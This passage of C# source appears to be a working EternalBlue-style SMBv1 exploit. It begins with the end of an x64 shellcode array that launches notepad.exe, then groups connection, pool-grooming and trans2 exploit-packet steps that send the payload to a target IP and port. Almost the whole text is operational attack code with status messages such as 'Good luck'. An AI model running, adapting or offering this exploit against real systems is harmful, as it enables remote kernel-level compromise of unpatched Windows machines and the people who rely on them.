0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,
0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 };

                byte[] shellcode = make_kernel_user_payload(buf);
                byte[] payload_hdr_pkt = make_smb2_payload_headers_packet();
                byte[] payload_body_pkt = make_smb2_payload_body_packet(shellcode);

                Console.WriteLine("Target appears to be vulnerable!");
                client = new TcpClient(ip, port);
                sock = client.Client;
                response = Client_Negotiate(sock);
                response = smb1_anonymous_login(sock);
                smbh = Parsed_SMBHeader(response);
                response = tree_connect_andx(ip, sock, smbh.user_id);
                smbh = Parsed_SMBHeader(response);
                sock.ReceiveTimeout = 2000;
                Console.WriteLine("Connection established for exploitation.");
                Console.WriteLine("Creating a large SMB1 buffer.");
                Console.WriteLine("All but last fragment of exploit packet");
                response = smb1_large_buffer(smbh, sock);

                Socket fhs_sock = smb1_free_hole(ip,port,true);

                List<Socket> grooms_socks = new List<Socket>();
                grooms_socks = smb2_grooms(ip, port, grooms, payload_hdr_pkt, grooms_socks);
                Console.WriteLine("Grooming...");

                Socket fhf_sock = smb1_free_hole(ip, port, false);

                fhs_sock.Close();

                grooms_socks = smb2_grooms(ip, port, 6, payload_hdr_pkt, grooms_socks);

                fhf_sock.Close();

                Console.WriteLine("Ready for final exploit...");

                byte[] trans2_pkt_nulled;
                byte[] final_exploit_pkt = trans2_pkt_nulled = make_smb1_trans2_exploit_packet(smbh.tree_id, smbh.user_id, "eb_trans2_exploit", 15);

                try
                {
                    sock.Send(final_exploit_pkt);
                    response = SMB1_Get_Response(sock);
                    smbh = new SMBHeader();
                    smbh = Parsed_SMBHeader(response);

                    Console.WriteLine("SMB code: " + BitConverter.ToString(smbh.error_code));
                } catch (Exception e)
                {
                    Console.WriteLine("Socket error, this might end badly");
                }

                Console.WriteLine("Sending exploits with the grooms");


                
                foreach (Socket s in grooms_socks)
                {
                    s.Send(payload_body_pkt.Take(2920).ToArray());
                }
                foreach (Socket s in grooms_socks)
                {
                    s.Send(payload_body_pkt.Skip(2920).ToArray());
                }
                foreach (Socket s in grooms_socks)
                {
                    s.Close();
                }
                Console.WriteLine("Exploit send successfully... Good luck");
                client.Close();
                sock.Close();
            }


        }
    }
}
